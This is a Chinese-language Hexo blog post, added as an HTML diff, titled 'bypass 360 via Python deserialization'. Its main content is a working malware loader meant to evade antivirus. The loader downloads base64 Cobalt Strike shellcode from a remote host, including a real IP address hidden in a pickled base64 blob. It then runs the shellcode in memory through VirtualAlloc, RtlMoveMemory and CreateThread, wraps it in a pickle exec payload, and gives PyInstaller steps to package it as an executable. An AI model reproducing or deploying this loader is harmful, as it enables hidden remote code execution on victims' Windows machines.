@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>利用python反序列化bypass360 - B1gd0g</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="https://spring.io/images/favicon-9d25009f65637a49ac8d91eb1cf7b75e.ico" type="image/x-icon" />
+    <meta name="description" content="利用python反序列化绕过常见杀毒">
+<meta property="og:type" content="article">
+<meta property="og:title" content="利用python反序列化bypass360">
+<meta property="og:url" content="https://b1gd0g.github.io/2021/02/20/%E5%88%A9%E7%94%A8python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96bypass360/index.html">
+<meta property="og:site_name" content="B1gd0g">
+<meta property="og:description" content="利用python反序列化绕过常见杀毒">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201448270.jpg">
+<meta property="article:published_time" content="2021-02-20T09:10:18.000Z">
+<meta property="article:modified_time" content="2022-10-10T10:00:35.022Z">
+<meta property="article:author" content="B1gd0g">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201448270.jpg">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1665474214490">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1665474214490">
+
+    
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202210111542873.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="B1gd0g" class="mdui-btn mdui-btn-icon"><img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="B1gd0g">
+            <img src="https://img2.baidu.com/it/u=3413024138,1887722785&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=500&amp;h=500" alt="B1gd0g" alt="B1gd0g">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>15</div>
+        <div><span>标签</span>12</div>
+        <div><span>分类</span>2</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E6%9D%80%E8%BD%AF%E5%AF%B9%E6%AF%94.html" title="杀软对比">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                杀软对比
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E7%A4%BE%E5%B7%A5%E5%AF%86%E7%A0%81.html" title="社工密码">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                社工密码
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/%E5%AF%BC%E8%88%AA.html" title="我的导航">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                我的导航
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <!-- 一言 -->
+<div class="nexmoe-widget-wrap">
+  <h3 class="nexmoe-widget-title">
+    一言
+  </h3>
+  <div class="nexmoe-widget">
+    <ul class="hitokoto-box">
+      <li id="hitokoto_text_parent" class="hitokoto-text" hitokotoCategory="">
+        <a href="#" id="hitokoto_text">
+          
+        </a>
+        <a href="#" id="hitokoto_error_text" style="display: none;">
+          
+        </a>
+      </li>
+    </ul>
+  </div>
+</div>
+
+<script>
+  let hitokotoText = document.getElementById('hitokoto_text')
+  let hitokotoErroText = document.getElementById('hitokoto_error_text')
+  let hitokotoCategory = document.getElementById('hitokoto_text_parent').getAttribute('hitokotoCategory')
+  window.onload = function () {
+    let url = 'https://v1.hitokoto.cn'
+    if (hitokotoCategory) {
+      url += '?c=' + hitokotoCategory
+    }
+    fetch(url)
+      .then(response => response.json())
+      .then(data => {
+        hitokotoText.innerText = "「 " + data.hitokoto + " 」 from " + data.from
+        hitokotoText.href = 'https://hitokoto.cn/?uuid=' + data.uuid
+      })
+      .catch((reason) => {
+        console.error(11, reason)
+        hitokotoText.style.display = 'none'
+        hitokotoErroText.style.display = 'block'
+      })
+  }
+</script>
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章分类</h3>
+    <div class="nexmoe-widget">
+
+      <ul class="category-list">
+
+        
+
+
+        
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/tools/">tools</a>
+          <span class="category-list-count">4</span>
+        </li>
+
+        
+
+        <li class="category-list-item">
+          <a class="category-list-link" href="/categories/安全小记/">安全小记</a>
+          <span class="category-list-count">10</span>
+        </li>
+
+        
+      </ul>
+
+    </div>
+  </div>
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <div id="randomtagcloud" class="nexmoe-widget tagcloud nexmoe-rainbow">
+      <a href="/tags/Html/" style="font-size: 10px;">Html</a> <a href="/tags/JavaScript/" style="font-size: 10px;">JavaScript</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/cmd/" style="font-size: 10px;">cmd</a> <a href="/tags/python/" style="font-size: 10px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 10px;">代码审计</a> <a href="/tags/%E5%85%8D%E6%9D%80/" style="font-size: 10px;">免杀</a> <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 10px;">内网渗透</a> <a href="/tags/%E6%8F%90%E6%9D%83/" style="font-size: 10px;">提权</a> <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/" style="font-size: 10px;">红蓝对抗</a> <a href="/tags/%E9%92%93%E9%B1%BC/" style="font-size: 10px;">钓鱼</a>
+    </div>
+    
+  </div>
+
+    
+        
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2022 B1gd0g
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover absolute" style="padding-top: 37.5%;"> 
+            <img src="https://raw.githubusercontent.com/B1gd0g/blog-img/master/img202210101800415.png" alt="利用python反序列化bypass360" loading="lazy">
+            <h1>利用python反序列化bypass360</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2021年02月20日</a>
+        
+            <a class="nexmoefont icon-appstore-fill -link" href="/categories/tools/">tools</a>
+        
+        
+    <a><i class="nexmoefont icon-areachart"></i>约347字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>预计需要1分钟</a>
+
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <p>利用python反序列化绕过常见杀毒</p>
+<a id="more"></a>
+
+<h3 id="处理shellcode"><a href="#处理shellcode" class="headerlink" title="处理shellcode"></a>处理shellcode</h3><p>先利用cs生成64位py脚本shellcode，再对shellcode进行base64编码上传到服务器，同时替换下列代码中地址，改为服务器地址，此代码为进行反序列化（利用python3运行）</p>
+<h3 id="进行反序列化脚本："><a href="#进行反序列化脚本：" class="headerlink" title="进行反序列化脚本："></a>进行反序列化脚本：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> pickle<br>shellcode = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">import ctypes,urllib.request,codecs,base64</span><br><span class="hljs-string">shellcode = urllib.request.urlopen(&#x27;http://www.xxx.com/shellcode.txt&#x27;).read()</span><br><span class="hljs-string">shellcode = base64.b64decode(shellcode)</span><br><span class="hljs-string">shellcode =codecs.escape_decode(shellcode)[0]</span><br><span class="hljs-string">shellcode = bytearray(shellcode)</span><br><span class="hljs-string"># 设置VirtualAlloc返回类型为ctypes.c_uint64</span><br><span class="hljs-string">ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64</span><br><span class="hljs-string"># 申请内存</span><br><span class="hljs-string">ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))</span><br><span class="hljs-string"># 放入shellcode</span><br><span class="hljs-string">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="hljs-string">ctypes.windll.kernel32.RtlMoveMemory(</span><br><span class="hljs-string">    ctypes.c_uint64(ptr), </span><br><span class="hljs-string">    buf, </span><br><span class="hljs-string">    ctypes.c_int(len(shellcode))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 创建一个线程从shellcode防止位置首地址开始执行</span><br><span class="hljs-string">handle = ctypes.windll.kernel32.CreateThread(</span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_uint64(ptr), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.c_int(0), </span><br><span class="hljs-string">    ctypes.pointer(ctypes.c_int(0))</span><br><span class="hljs-string">)</span><br><span class="hljs-string"># 等待上面创建的线程运行完</span><br><span class="hljs-string">ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle),ctypes.c_int(-1))&quot;&quot;&quot;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">exec</span>, (shellcode,))<br>ret = pickle.dumps(A())<br>ret_base64 = base64.b64encode(ret)<br>print(ret_base64)<br><span class="hljs-comment">#ret_decode = base64.b64decode(ret_base64)</span><br></code></pre></td></tr></table></figure>
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://cdn.jsdelivr.net/gh/B1gd0g/blog-img/img202205201448270.jpg" alt="img" data-caption="img" loading="lazy"></p>
+<p>此脚本为生成的木马脚本（替换shellcode内容为反序列化脚本生成的shellcode）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64,pickle,ctypes,urllib.request<br>shellcode =<span class="hljs-string">b&#x27;gANjYnVpbHRpbnMKZXhlYwpxAFg0BAAACmltcG9ydCBjdHlwZXMsdXJsbGliLnJlcXVlc3QsY29kZWNzLGJhc2U2NAoKc2hlbGxjb2RlID0gdXJsbGliLnJlcXVlc3QudXJsb3BlbignaHR0cDovLzguMjEwLjEwNS4xNjgvYml1Yml1LnR4dCcpLnJlYWQoKQpzaGVsbGNvZGUgPSBiYXNlNjQuYjY0ZGVjb2RlKHNoZWxsY29kZSkKc2hlbGxjb2RlID1jb2RlY3MuZXNjYXBlX2RlY29kZShzaGVsbGNvZGUpWzBdCnNoZWxsY29kZSA9IGJ5dGVhcnJheShzaGVsbGNvZGUpCiMg6K6+572uVmlydHVhbEFsbG9j6L+U5Zue57G75Z6L5Li6Y3R5cGVzLmNfdWludDY0CmN0eXBlcy53aW5kbGwua2VybmVsMzIuVmlydHVhbEFsbG9jLnJlc3R5cGUgPSBjdHlwZXMuY191aW50NjQKIyDnlLPor7flhoXlrZgKcHRyID0gY3R5cGVzLndpbmRsbC5rZXJuZWwzMi5WaXJ0dWFsQWxsb2MoY3R5cGVzLmNfaW50KDApLCBjdHlwZXMuY19pbnQobGVuKHNoZWxsY29kZSkpLCBjdHlwZXMuY19pbnQoMHgzMDAwKSwgY3R5cGVzLmNfaW50KDB4NDApKQoKIyDmlL7lhaVzaGVsbGNvZGUKYnVmID0gKGN0eXBlcy5jX2NoYXIgKiBsZW4oc2hlbGxjb2RlKSkuZnJvbV9idWZmZXIoc2hlbGxjb2RlKQpjdHlwZXMud2luZGxsLmtlcm5lbDMyLlJ0bE1vdmVNZW1vcnkoCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBidWYsIAogICAgY3R5cGVzLmNfaW50KGxlbihzaGVsbGNvZGUpKQopCiMg5Yib5bu65LiA5Liq57q/56iL5LuOc2hlbGxjb2Rl6Ziy5q2i5L2N572u6aaW5Zyw5Z2A5byA5aeL5omn6KGMCmhhbmRsZSA9IGN0eXBlcy53aW5kbGwua2VybmVsMzIuQ3JlYXRlVGhyZWFkKAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5jX2ludCgwKSwgCiAgICBjdHlwZXMuY191aW50NjQocHRyKSwgCiAgICBjdHlwZXMuY19pbnQoMCksIAogICAgY3R5cGVzLmNfaW50KDApLCAKICAgIGN0eXBlcy5wb2ludGVyKGN0eXBlcy5jX2ludCgwKSkKKQojIOetieW+heS4iumdouWIm+W7uueahOe6v+eoi+i/kOihjOWujApjdHlwZXMud2luZGxsLmtlcm5lbDMyLldhaXRGb3JTaW5nbGVPYmplY3QoY3R5cGVzLmNfaW50KGhhbmRsZSksY3R5cGVzLmNfaW50KC0xKSlxAYVxAlJxAy4=&#x27;</span><br>pickle.loads(base64.b64decode(shellcode))<br></code></pre></td></tr></table></figure>
+
+
+<p>最后们利用pyinstaller进行打包成exe（需用高版本python以及pyinstaller打包，否则不能上线）python3.7+pyinstaller4.1</p>
+
+    
+  </article>
+
+  
+      
+
+  
+  
+  <div class="nexmoe-post-meta nexmoe-rainbow">
+   
+    
+</div>
+
+  
+      <div class="nexmoe-post-footer">
+          
+      </div>
+  
+</div>
+            <div class="nexmoe-post-right">
+              <div class="nexmoe-fixed">
+                  <div class="nexmoe-tool"> 
+                    
+                      
+                        
+                          
+                          
+                              <button class="mdui-fab catalog" style="overflow:unset;">
+                                  <i class="nexmoefont icon-i-catalog"></i>
+                                  <div class="nexmoe-toc">
+                                      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%84%E7%90%86shellcode"><span class="toc-number">1.</span> <span class="toc-text">处理shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%84%9A%E6%9C%AC%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">进行反序列化脚本：</span></a></li></ol>
+                                  </div>
+                              </button>
+                          
+                          
+                      
+                    
+                      <a href="#nexmoe-content" class="toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+                  </div>
+              </div>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-search-space">
+	<div class="search-container">
+		<div class="search-header">
+			<div class="search-input-container">
+				<input
+					class="search-input"
+					type="text"
+					placeholder="搜索"
+					oninput="sinput();"
+				/>
+			</div>
+			<a class="search-close" onclick="sclose();">×</a>
+		</div>
+		<div class="search-body"></div>
+	</div>
+</div>
+
+    
+<script src="/lib/mdui_043tiny/mdui.js"></script>
+<script src="/lib/fancybox/fancybox.umd.js"></script>
+
+
+ 
+
+<script async src="/js/app.js?v=1665474214491"></script>
+
+
+
+</body>
+
+</html>
